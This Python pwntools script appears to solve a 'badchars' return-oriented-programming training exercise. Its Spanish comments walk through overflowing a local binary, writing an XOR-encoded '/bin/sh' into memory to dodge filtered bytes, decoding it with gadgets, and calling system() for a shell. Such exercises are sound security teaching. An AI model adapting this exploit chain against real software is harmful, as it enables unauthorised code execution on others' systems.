#!/usr/bin/env python

from pwn import *

pop_r12_r13 = p64(0x400b3b)             #
mov_R13_r12 = p64(0x400b34)             #
pop_r14_r15 = p64(0x400bb0)             #
pop_r15 = p64(0x400bb2)                 #
xor_R15_r14 = p64(0x400b30)             #
xored_0x3a_str = b"\x15XST\x15IR\x3a"   # xor(/bin/sh\x00, 0x3a)
xor_key = p64(0x3a)                     #
w_region = 0x601800                     #
pop_rdi = p64(0x00400b43)               #
system_plt = p64(0x004006f0)            #

payload = b"A"*40              # Desbordamos

payload += pop_r12_r13         # Ponemos los valores en el registro
payload += xored_0x3a_str      # Valor de r12
payload += p64(w_region)       # r13 apunta a la region escribible

payload += mov_R13_r12         # ROP para escribir

payload += pop_r14_r15         # ROP para setear r14 y r15
payload += xor_key             # Valor de la xor key
payload += p64(w_region)       # Direccion del byte a corear
payload += xor_R15_r14         # ROP para xorear

payload += pop_r15             # ROP para setear r15
payload += p64(w_region+1)     # Direccion del byte a corear
payload += xor_R15_r14         # ROP para xorear

payload += pop_r15             # ROP para setear r15
payload += p64(w_region+2)     # Direccion del byte a corear
payload += xor_R15_r14         # ROP para xorear

payload += pop_r15             # ROP para setear r15
payload += p64(w_region+3)     # Direccion del byte a corear
payload += xor_R15_r14         # ROP para xorear

payload += pop_r15             # ROP para setear r15
payload += p64(w_region+4)     # Direccion del byte a corear
payload += xor_R15_r14         # ROP para xorear

payload += pop_r15             # ROP para setear r15
payload += p64(w_region+5)     # Direccion del byte a corear
payload += xor_R15_r14         # ROP para xorear

payload += pop_r15             # ROP para setear r15
payload += p64(w_region+6)     # Direccion del byte a corear
payload += xor_R15_r14         # ROP para xorear

payload += pop_r15             # ROP para setear r15
payload += p64(w_region+7)     # Direccion del byte a corear
payload += xor_R15_r14         # ROP para xorear

payload += pop_rdi
payload += p64(w_region)
payload += system_plt

e = process('./badchars')
print(e.recv())
e.sendline(payload)
e.interactive()
